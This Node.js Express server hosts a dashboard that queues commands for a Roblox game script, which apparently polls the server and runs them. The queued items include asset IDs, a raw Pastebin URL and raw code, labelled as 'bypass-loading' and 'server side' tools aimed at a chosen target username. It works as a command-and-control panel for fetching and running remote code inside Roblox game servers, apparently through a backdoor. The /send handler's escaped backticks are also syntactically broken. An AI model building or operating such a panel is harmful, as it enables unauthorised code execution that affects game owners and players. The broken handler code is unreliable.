const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

// This queue stores commands until the Roblox game asks for them
let commandQueue = [];

app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Roblox Remote Dashboard</title>
            <style>
                :root { 
                    --bg: #0b0e14; 
                    --card-bg: #161b22; 
                    --text: #adbac7; 
                    --accent: #58a6ff; 
                    --border: #30363d; 
                    --success: #3fb950; 
                }

                body { 
                    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
                    background-color: var(--bg); 
                    color: var(--text); 
                    margin: 0; 
                    display: flex; 
                    flex-direction: column; 
                    align-items: center; 
                    padding: 40px 20px; 
                }
                
                .header-section { 
                    text-align: center; 
                    margin-bottom: 40px; 
                    width: 100%; 
                    max-width: 800px; 
                }

                h1 { color: #ffffff; margin-bottom: 25px; font-weight: 300; letter-spacing: 1px; }
                
                .whitelist-box { 
                    background: #1c2128; 
                    padding: 20px; 
                    border-radius: 12px; 
                    border: 1px solid var(--accent); 
                    display: inline-block; 
                    box-shadow: 0 4px 15px rgba(0,0,0,0.4);
                }

                label { 
                    display: block; 
                    margin-bottom: 12px; 
                    font-size: 11px; 
                    text-transform: uppercase; 
                    letter-spacing: 1.5px; 
                    color: var(--accent); 
                    font-weight: bold;
                }

                input { 
                    background: #0d1117; 
                    border: 1px solid var(--border); 
                    color: white; 
                    padding: 12px 20px; 
                    border-radius: 6px; 
                    outline: none; 
                    width: 280px; 
                    font-size: 16px; 
                    text-align: center;
                    transition: 0.2s;
                }

                input:focus { border-color: var(--accent); box-shadow: 0 0 10px rgba(88, 166, 255, 0.2); }

                .status-info { 
                    font-size: 11px; 
                    margin-top: 20px; 
                    color: #768390; 
                    text-transform: uppercase; 
                    letter-spacing: 1px;
                }

                #status { color: var(--success); font-weight: bold; }

                /* THE GRID */
                .grid { 
                    display: grid; 
                    grid-template-columns: repeat(auto-fit, minmax(240px, 1fr)); 
                    gap: 25px; 
                    width: 100%; 
                    max-width: 850px; 
                    margin-top: 20px; 
                }

                /* THE CARDS (X=~250px, Y=~180px) */
                .card { 
                    background: var(--card-bg); 
                    border: 1px solid var(--border); 
                    border-radius: 12px; 
                    overflow: hidden; 
                    transition: 0.3s cubic-bezier(0.4, 0, 0.2, 1); 
                    cursor: pointer; 
                }

                .card:hover { 
                    transform: translateY(-8px); 
                    border-color: var(--accent); 
                    box-shadow: 0 12px 24px rgba(0,0,0,0.5); 
                }

                .card-image { 
                    width: 100%; 
                    height: 110px; 
                    background-size: cover; 
                    background-position: center; 
                    background-color: #21262d;
                    filter: brightness(0.7);
                    transition: 0.3s;
                }

                .card:hover .card-image { filter: brightness(1.1); }

                .card-content { 
                    padding: 20px; 
                    text-align: center; 
                    border-top: 1px solid var(--border);
                }

                .card-title { font-size: 17px; font-weight: 600; color: #ffffff; margin: 0; }
                .card-description { font-size: 13px; color: #768390; margin-top: 8px; line-height: 1.4; }
            </style>
        </head>
        <body>
            <div class="header-section">
                <h1>Control Panel</h1>
                <div class="whitelist-box">
                    <label>Target Username</label>
                    <input type="text" id="usernameInput" placeholder="Enter Roblox Name..." oninput="updateUser()">
                </div>
                <div class="status-info">
                    Connection: <span id="status">Active</span> | 
                    User: <span id="displayUser" style="color:#fff">None</span>
                </div>
            </div>
            
            <div class="grid">
                <div class="card" onclick="send('142785488')">
                    <div class="card-image" style="background-image: url('https://tr.rbxcdn.com/30day-pa0903328575089f9353974d61993245/420/420/Image/Png');"></div>
                    <div class="card-content">
                        <p class="card-title">F3X Tools</p>
                        <p class="card-description">Bypass-loading Building Tools.</p>
                    </div>
                </div>

                <div class="card" onclick="send('https://pastebin.com/raw/S8R3Y4Qy')">
                    <div class="card-image" style="background-image: url('https://raw.githubusercontent.com/crazy-invader135/RBLXSS/refs/heads/main/Images/F3X.png');"></div>
                    <div class="card-content">
                        <p class="card-title">F3X Build tools</p>
                        <p class="card-description">Universal server side F3X build tools</p>
                    </div>
                </div>

                <div class="card" onclick="send('print(\\'Server Handshake OK\\')')">
                    <div class="card-image" style="background-color: #232d38;"></div>
                    <div class="card-content">
                        <p class="card-title">Ping Server</p>
                        <p class="card-description">Simple console connectivity test.</p>
                    </div>
                </div>
            </div>

            <script>
                // Persistent User Storage
                const savedUser = localStorage.getItem('robloxWhitelist') || "";
                document.getElementById('usernameInput').value = savedUser;
                document.getElementById('displayUser').innerText = savedUser || "None";

                function updateUser() {
                    const val = document.getElementById('usernameInput').value;
                    localStorage.setItem('robloxWhitelist', val);
                    document.getElementById('displayUser').innerText = val || "None";
                }

                function send(id) {
                    const user = localStorage.getItem('robloxWhitelist');
                    if (!user || user === "") {
                        alert("Please enter a Target Username first!");
                        return;
                    }
                    // We send the ID (can be an Asset ID, a URL, or raw code)
                    fetch(\`/send?id=\${encodeURIComponent(id)}&target=\${encodeURIComponent(user)}\`);
                }

                // Heartbeat check to keep status "Online"
                setInterval(() => {
                    fetch('/ping').then(() => {
                        document.getElementById('status').innerText = "ONLINE";
                        document.getElementById('status').style.color = "#3fb950";
                    }).catch(() => {
                        document.getElementById('status').innerText = "OFFLINE";
                        document.getElementById('status').style.color = "#f85149";
                    });
                }, 5000);
            </script>
        </body>
        </html>
    `);
});

// --- API ENDPOINTS ---

app.get('/send', (req, res) => {
    const { id, target } = req.query;
    if (id && target) {
        commandQueue.push({ id, target });
        console.log(\`[QUEUED] \${id} for \${target}\`);
        res.send("OK");
    } else {
        res.status(400).send("Missing Params");
    }
});

app.get('/getCommand', (req, res) => {
    // Roblox script calls this every few seconds
    res.json(commandQueue.shift() || { id: null });
});

app.get('/ping', (req, res) => res.send("pong"));

app.listen(PORT, () => console.log("Control Panel Live on Port " + PORT));
